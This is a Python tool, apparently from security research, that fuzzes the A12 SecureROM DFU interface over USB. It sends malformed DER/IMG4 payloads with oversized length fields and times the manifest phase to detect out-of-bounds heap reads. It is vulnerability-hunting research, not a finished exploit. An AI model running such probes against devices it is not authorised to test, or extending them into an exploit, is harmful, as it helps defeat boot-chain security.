#!/usr/bin/env python3
"""
A12 SecureROM — Manifest Phase Timing Oracle
==============================================
The DFU buffer is exactly 2048 bytes.
Payloads >2048B are rejected at transport level (~1s timeout).

Key insight: The DER parser processes data IN the buffer.
If we craft a DER structure inside 2048B that claims a LARGE length,
the parser might:
  1. Read beyond the 2048B buffer (OOB read → heap metadata)
  2. The timing would differ based on how far it reads

This tool measures MANIFEST phase timing precisely with various DER
structures, all exactly 2048 bytes, to:
  - Detect OOB read via timing differences
  - Map what's adjacent to the buffer in memory
  - Find DER structures that trigger different parsing paths
"""
import time, json, struct, statistics
from datetime import datetime
from pathlib import Path

import usb.core, usb.util, libusb_package, usb.backend.libusb1

APPLE_VID = 0x05AC; DFU_PID = 0x1227

def be():
    return usb.backend.libusb1.get_backend(find_library=libusb_package.find_library)

def log(msg):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)

def us_str(ns):
    return f"{ns/1000:.1f}us"

class ManifestOracle:
    def __init__(self):
        self.dev = None
        self.usb_overhead_ns = 0

    def connect(self):
        self.dev = usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be())
        if self.dev:
            try: self.dev.set_configuration()
            except: pass
            return True
        return False

    def alive(self):
        try: return usb.core.find(idVendor=APPLE_VID, idProduct=DFU_PID, backend=be()) is not None
        except: return False

    def ctrl(self, rt, req, val, idx, data_or_len, timeout=5000):
        return self.dev.ctrl_transfer(rt, req, val, idx, data_or_len, timeout=timeout)

    def status(self):
        """Returns (state, bStatus, poll_ms) or None"""
        try:
            r = self.ctrl(0xA1, 3, 0, 0, 6)
            if len(r) >= 6:
                return (r[4], r[0], r[1]|(r[2]<<8)|(r[3]<<16))
        except: pass
        return None

    def get_state(self):
        """GET_STATE — just state byte"""
        try:
            r = self.ctrl(0xA1, 5, 0, 0, 1)
            return r[0] if r else None
        except: return None

    def abort(self):
        try: self.ctrl(0x21, 6, 0, 0, 0)
        except: pass

    def clr_status(self):
        try: self.ctrl(0x21, 4, 0, 0, 0)
        except: pass

    def to_idle(self):
        """Get device to dfuIDLE (state 2)"""
        for _ in range(30):
            s = self.status()
            if not s:
                time.sleep(0.1); self.connect(); continue
            state = s[0]
            if state == 2:
                return True
            elif state == 10:   # ERROR
                self.clr_status()
            elif state in (3, 5, 6, 7):  # SYNC, IDLE, MANIFEST
                self.abort()
            elif state == 4:    # BUSY
                time.sleep(s[2]/1000.0 + 0.05)
                self.status()
                self.abort()
            elif state == 8:    # MANIFEST-WAIT-RESET
                try: self.dev.reset()
                except: pass
                time.sleep(2); self.connect()
            else:
                self.abort()
            time.sleep(0.02)
        return False

    def calibrate_usb(self, n=20):
        """Measure pure USB round-trip overhead with GET_DESCRIPTOR"""
        times = []
        for _ in range(n):
            t0 = time.perf_counter_ns()
            try: self.ctrl(0x80, 6, 0x0100, 0, 18)
            except: continue
            dt = time.perf_counter_ns() - t0
            times.append(dt)
        if times:
            self.usb_overhead_ns = statistics.median(times)
            log(f"USB overhead: {us_str(self.usb_overhead_ns)} (median of {len(times)})")
        return self.usb_overhead_ns

    def precise_manifest(self, payload, repeats=3):
        """
        Send payload via DNLOAD, then precisely measure the manifest phase.
        
        DFU flow on A12:
          1. DNLOAD (payload) → device in dfuDNLOAD-SYNC (3)
          2. GET_STATUS → transitions to processing
          3. ...eventually → dfuMANIFEST-SYNC (6) or dfuERROR (10)
        
        Returns detailed timing for each phase.
        """
        all_results = []
        
        for rep in range(repeats):
            if not self.to_idle():
                all_results.append({"error": "no_idle"})
                continue

            # Phase 1: DNLOAD with data
            t_start = time.perf_counter_ns()
            try:
                self.ctrl(0x21, 1, 0, 0, payload, timeout=5000)
            except usb.core.USBError as e:
                dt = time.perf_counter_ns() - t_start
                all_results.append({"error": f"dnload_fail: {e}", "dnload_ns": dt})
                continue
            t_dnload = time.perf_counter_ns()

            # Phase 2: GET_STATUS after data DNLOAD
            s1 = self.status()
            t_status1 = time.perf_counter_ns()
            
            if not s1:
                all_results.append({"error": "no_status1", 
                                    "dnload_ns": t_dnload - t_start})
                continue

            state1, bstatus1, poll1 = s1

            # Phase 3: If in DNLOAD-IDLE (5), send zero-length DNLOAD to trigger manifest
            t_manifest_trigger = t_status1
            if state1 == 5:
                try:
                    self.ctrl(0x21, 1, 0, 0, b"", timeout=5000)
                except usb.core.USBError:
                    pass
                t_manifest_trigger = time.perf_counter_ns()
                # GET_STATUS to enter manifest
                s_m = self.status()
                if s_m:
                    state1 = s_m[0]  # Should now be 6 (MANIFEST-SYNC) or similar

            # Phase 4: Poll until manifest completes
            # States: 2=IDLE, 3=DNLOAD-SYNC, 4=DNLOAD-BUSY, 5=DNLOAD-IDLE,
            #         6=MANIFEST-SYNC, 7=MANIFEST, 8=MANIFEST-WAIT-RESET, 10=ERROR
            states = [(state1, time.perf_counter_ns() - t_start)]
            
            for _ in range(500):
                s = self.status()
                t_now = time.perf_counter_ns()
                if not s: break
                
                cur_state, cur_bstatus, cur_poll = s
                states.append((cur_state, t_now - t_start))
                
                # Terminal states
                if cur_state == 2:   # IDLE (success or silent fail)
                    break
                if cur_state == 10:  # ERROR
                    break
                if cur_state == 8:   # MANIFEST-WAIT-RESET
                    break
                    
                # Non-terminal: keep polling
                if cur_state == 4:   # BUSY — wait poll_ms
                    time.sleep(max(0.001, cur_poll / 2000.0))
            
            t_end = time.perf_counter_ns()
            
            # Extract timings
            unique_states = []
            state_transitions = []
            prev_st = None
            for st, ns in states:
                if st != prev_st:
                    unique_states.append(st)
                    state_transitions.append({"state": st, "time_us": round(ns/1000, 1)})
                    prev_st = st
            
            result = {
                "rep": rep,
                "size": len(payload),
                "dnload_us": round((t_dnload - t_start) / 1000, 1),
                "total_us": round((t_end - t_start) / 1000, 1),
                "state1": state1,
                "poll1": poll1,
                "final_state": states[-1][0] if states else None,
                "n_polls": len(states),
                "state_flow": unique_states,
                "transitions": state_transitions,
            }
            all_results.append(result)
        
        return all_results

    def run(self):
        log("="*60)
        log("A12 SecureROM — Manifest Phase Timing Oracle")
        log("="*60)

        if not self.connect():
            log("NO DFU DEVICE"); return

        self.calibrate_usb()
        results = {"timestamp": datetime.now().isoformat(), 
                   "usb_overhead_us": round(self.usb_overhead_ns/1000, 1)}

        REPEATS = 5

        # ============================================================
        # Test 1: Baseline — different sizes, all zeros
        # ============================================================
        log("\n=== Test 1: Baseline manifest timing by size ===")
        baseline = {}
        for size in [16, 64, 256, 512, 1024, 1536, 2048]:
            payload = bytes(size)
            r = self.precise_manifest(payload, repeats=REPEATS)
            baseline[str(size)] = r
            
            totals = [x["total_us"] for x in r if "total_us" in x]
            flows = [str(x.get("state_flow", "?")) for x in r]
            if totals:
                log(f"  {size:5d}B: total={statistics.median(totals):.0f}us "
                    f"flow={flows[0]} (n={len(totals)})")
            else:
                log(f"  {size:5d}B: FAILED — {r}")

        results["baseline"] = baseline

        # ============================================================
        # Test 2: DER structures that claim LARGE lengths
        # The parser might try to read beyond the 2048B buffer
        # ============================================================
        log("\n=== Test 2: DER length overflow attempts (all 2048B) ===")
        
        def make_der_payload(der_prefix, total=2048, fill=0x00):
            """Build payload: der_prefix + padding to total size"""
            return der_prefix + bytes([fill]) * (total - len(der_prefix))

        der_tests = {}
        test_cases = [
            # Name, DER prefix bytes
            ("baseline_zeros",  bytes(6)),
            ("seq_exact_2048",  b"\x30\x82\x07\xFA"),     # SEQUENCE, length=2042 (fits in 2048)
            ("seq_claims_4096", b"\x30\x82\x0F\xFA"),     # SEQUENCE, length=4090 (claims 2x buffer!)
            ("seq_claims_8192", b"\x30\x82\x1F\xFA"),     # SEQUENCE, length=8186
            ("seq_claims_64k",  b"\x30\x82\xFF\xFA"),     # SEQUENCE, length=65530
            ("seq_claims_16M",  b"\x30\x83\xFF\xFF\xFA"), # SEQUENCE, length=16M
            ("seq_claims_4G",   b"\x30\x84\xFF\xFF\xFF\xFA"), # SEQUENCE, length=4G
            
            # IMG4 magic with large inner length
            ("img4_exact",     b"\x30\x82\x07\xF6\x16\x04IMG4"),
            ("img4_claims_4k", b"\x30\x82\x0F\xF6\x16\x04IMG4"),
            ("img4_claims_64k",b"\x30\x82\xFF\xF6\x16\x04IMG4"),
            
            # IM4P with large payload length
            ("im4p_exact",     b"\x30\x82\x07\xF6\x16\x04IM4P"),
            ("im4p_claims_4k", b"\x30\x82\x0F\xF6\x16\x04IM4P"),
            
            # Nested sequences with overflow
            ("nested_inner_4k",b"\x30\x82\x07\xFA" + b"\x30\x82\x0F\xFA"),
            
            # OCTET STRING with large length (raw data container)
            ("octet_claims_4k", b"\x04\x82\x0F\xFA"),
            ("octet_claims_64k",b"\x04\x82\xFF\xFA"),
            
            # BIT STRING with large length
            ("bitstr_claims_4k", b"\x03\x82\x0F\xFA"),
            
            # Integer with large length (could be key material)
            ("int_claims_4k",  b"\x02\x82\x0F\xFA"),
            
            # UTF8String (Apple uses these)
            ("utf8_claims_4k", b"\x0C\x82\x0F\xFA"),
            
            # Context-specific tags (common in IMG4)
            ("ctx0_claims_4k", b"\xA0\x82\x0F\xFA"),
            ("ctx1_claims_4k", b"\xA1\x82\x0F\xFA"),
        ]

        for name, prefix in test_cases:
            payload = make_der_payload(prefix)
            r = self.precise_manifest(payload, repeats=REPEATS)
            der_tests[name] = r
            
            totals = [x["total_us"] for x in r if "total_us" in x]
            flows = [str(x.get("state_flow", "?")) for x in r]
            if totals:
                med = statistics.median(totals)
                log(f"  {name:22s}: total={med:>8.0f}us flow={flows[0]}")
            else:
                log(f"  {name:22s}: FAILED")

        results["der_overflow"] = der_tests

        # ============================================================
        # Test 3: Content-dependent timing at exactly 2048B
        # If the parser reads the full buffer, content that looks like
        # valid DER deep inside might cause different parse paths
        # ============================================================
        log("\n=== Test 3: Content patterns affecting parse depth ===")
        
        content_tests = {}
        content_cases = [
            ("all_zeros",     bytes(2048)),
            ("all_0xFF",      b"\xFF" * 2048),
            ("all_0x30",      b"\x30" * 2048),  # all SEQUENCE tags
            ("alternating",   (b"\x30\x00") * 1024),  # empty sequences
            
            # Place valid DER at different offsets to see if parser scans
            ("img4_at_0",     b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
            ("img4_at_1024",  bytes(1024) + b"\x30\x82\x03\xF6\x16\x04IMG4" + bytes(1014)),
            ("img4_at_2040",  bytes(2040) + b"\x16\x04IMG4" + bytes(2)),
            
            # Craft payload where DER says to read past 2048 into heap
            # SEQUENCE(len=4090) => parser should try to read 4090 bytes of content
            # but only 2044 are available in buffer — will it read 2046 bytes
            # from adjacent heap memory?
            ("heap_read_seq", b"\x30\x82\x0F\xFA" + bytes(2044)),
        ]

        for name, payload in content_cases:
            assert len(payload) == 2048, f"{name}: {len(payload)}"
            r = self.precise_manifest(payload, repeats=REPEATS)
            content_tests[name] = r
            
            totals = [x["total_us"] for x in r if "total_us" in x]
            if totals:
                med = statistics.median(totals)
                mn = min(totals)
                mx = max(totals)
                log(f"  {name:20s}: median={med:>8.0f}us min={mn:.0f} max={mx:.0f}")

        results["content_patterns"] = content_tests

        # ============================================================
        # Test 4: GET_STATUS after manifest — does poll_ms change?
        # ============================================================
        log("\n=== Test 4: Poll timing and state transitions ===")
        
        poll_tests = {}
        for name, payload in [
            ("zeros_16",   bytes(16)),
            ("zeros_2048", bytes(2048)),
            ("img4_2048",  b"\x30\x82\x07\xF6\x16\x04IMG4" + bytes(2038)),
            ("big_len",    b"\x30\x84\xFF\xFF\xFF\xFA" + bytes(2042)),
        ]:
            if not self.to_idle():
                log(f"  {name}: no idle"); continue
                
            # DNLOAD
            try:
                self.ctrl(0x21, 1, 0, 0, payload)
            except:
                log(f"  {name}: dnload fail"); continue
            
            # Rapid-fire GET_STATUS to capture all transitions
            polls = []
            for i in range(50):
                t0 = time.perf_counter_ns()
                s = self.status()
                dt = time.perf_counter_ns() - t0
                if not s: break
                polls.append({
                    "i": i,
                    "state": s[0],
                    "bstatus": s[1],
                    "poll_ms": s[2],
                    "rtt_us": round(dt/1000, 1)
                })
                if s[0] in (2, 10, 8): break
            
            poll_tests[name] = polls
            states_seq = [p["state"] for p in polls]
            polls_seq = list(set(p["poll_ms"] for p in polls))
            rtts = [p["rtt_us"] for p in polls]
            log(f"  {name:15s}: states={states_seq[:10]} polls={polls_seq} "
                f"rtt_range=[{min(rtts):.0f}-{max(rtts):.0f}]us")

        results["poll_analysis"] = poll_tests

        # Save
        outf = Path(__file__).parent / "results" / "manifest_oracle.json"
        outf.parent.mkdir(exist_ok=True)
        with open(outf, "w") as f:
            json.dump(results, f, indent=2)
        log(f"\nSaved: {outf}")

if __name__ == "__main__":
    o = ManifestOracle()
    o.run()
